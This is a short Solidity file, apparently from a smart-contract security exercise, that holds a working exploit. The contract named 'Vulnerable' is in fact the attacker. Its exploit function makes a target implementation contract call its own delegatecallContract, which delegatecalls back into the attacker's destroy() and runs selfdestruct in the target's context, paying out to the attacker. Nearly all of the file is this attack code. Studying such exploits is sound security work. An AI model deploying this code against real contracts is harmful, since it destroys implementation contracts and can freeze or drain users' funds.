// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IImplement {
  function callContract(address a, bytes calldata _calldata)
    external
    payable
    returns (bytes memory);

  function delegatecallContract(address a, bytes calldata _calldata)
    external
    payable
    returns (bytes memory);
}

// vulnerable contract to exploit vulnerability in  implementation
contract Vulnerable {
  address payable private attacker;

  constructor() {
    attacker = payable(msg.sender);
  }

  //Function that call the exploit in implementation contract

  function exploit(address imp) external {
    bytes memory data = abi.encodeWithSignature(
      "delegatecallContract(address,bytes)",
      address(this),
      abi.encodeWithSignature("destroy()")
    );
    IImplement(imp).callContract(imp, data);
  }

  // this is the Function which executes for Implementation contract

  function destroy() external {
    selfdestruct(attacker);
  }
}
